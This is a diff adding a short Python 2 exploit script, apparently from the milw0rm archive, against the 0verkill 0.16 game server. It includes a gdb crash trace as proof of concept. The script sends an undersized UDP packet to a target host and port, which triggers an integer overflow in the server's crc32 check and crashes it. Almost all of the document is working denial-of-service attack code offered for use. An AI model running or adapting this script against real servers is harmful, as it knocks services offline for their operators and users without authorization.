@@ -1,0 +1,83 @@
+#!/usr/bin/env python
+#
+# -----------------------------------------------------
+# Exploit id: FSE:016
+#
+# Author:     Federico Fazzi
+# Contact:    federico@autistici.org
+# Date:	    09/06/2006, 13:58
+# Sinthesis:  0verkill 0.16, Remote integer overflow
+# Product:    http://artax.karlin.mff.cuni.cz/~brain/0verkill/
+# -----------------------------------------------------
+#
+# Start with:
+# python f_0k-0.1.py <remote_addr> <remote_port>
+#
+
+# Proof of concept:
+# (gdb) run
+# Starting program: /home/federico/0verkill-0.16/server
+# 9. 6.2006 14:18:07  Running 0verkill server version 0.16
+# 9. 6.2006 14:18:07  Initialization.
+# 9. 6.2006 14:18:07  Loading sprites.
+# 9. 6.2006 14:18:07  Loading level "level1"....
+# 9. 6.2006 14:18:07  Loading level graphics.
+# 9. 6.2006 14:18:08  Loading level map.
+# 9. 6.2006 14:18:08  Loading level objects.
+# 9. 6.2006 14:18:08  Initializing socket.
+# 9. 6.2006 14:18:08  Installing signal handlers.
+# 9. 6.2006 14:18:08  Game started.
+# 9. 6.2006 14:18:08  Sleep
+# 9. 6.2006 14:18:10  Wakeup
+#
+# (run python f_0k-0.6.py)
+#
+# Program received signal SIGSEGV, Segmentation fault.
+# crc32 (buf=0x837a000 <Address 0x837a000 out of bounds>, len=4294967288) at crc32.c:82
+# warning: Source file is more recent than executable.
+# 82            DO8(buf);
+#
+# #0  0x0805b54a in recv_packet (packet=0x805fd20 "",
+# max_len=256, addr=0xf18df475, addr_len=0xf18df475, sender_server=0, recipient=0,
+# sender=0xbfcf6d54) at net.c:94
+# 94              if (crc!=crc32(packet,retval-12))return -1;
+#
+# limits byte receive is 12, if you send an inferior number of it
+# the game crash.
+
+import os, sys
+from socket import *
+
+usage = "run: python %s [remote_addr] [remote_port] " % os.path.basename(sys.argv[0])
+
+if len(sys.argv) < 3: 
+	print usage 
+	sys.exit()
+
+host = sys.argv[1]
+port = int(sys.argv[2])
+
+sock = socket(AF_INET, SOCK_DGRAM)
+sock.connect((host, port))
+
+print "connecting.. ",
+if sock > 0:
+    print "done!"
+else:
+    print "wrong!"
+
+print "crashing the server.. ",
+if sock.sendto('0x00' , (host, port)):
+    print "done!"
+else:
+    print "wrong!"
+
+print "wait five seconds, if no data found press CTRL+C"
+try:
+	reply = sock.recvfrom(512)
+	print reply
+except:
+	print "no data receive!"
+	sys.exit()
+
+# milw0rm.com [2006-06-09]
